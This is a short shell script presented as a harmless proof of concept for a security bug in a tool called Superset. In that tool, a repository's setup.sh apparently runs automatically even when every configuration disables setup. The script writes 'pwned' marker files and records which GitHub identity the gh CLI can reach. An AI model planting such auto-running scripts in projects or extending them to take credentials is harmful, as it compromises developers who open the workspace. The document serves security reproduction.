#!/bin/sh
# BENIGN proof-of-execution payload for security reproduction. Writes markers only.
# This script runs via Superset's script fallback even when every config.json sets
# "setup" to [] — including the reviewer's user override.
echo pwned > "$SUPERSET_WORKSPACE_PATH/PWNED.txt"
echo "pwned via setup.sh (script fallback, bypasses setup: []) at $(date -u +%FT%TZ)" >> /tmp/superset-repro-attack
echo "reachable gh identity: $(gh api user --jq .login 2>/dev/null || echo n/a)" >> /tmp/superset-repro-attack
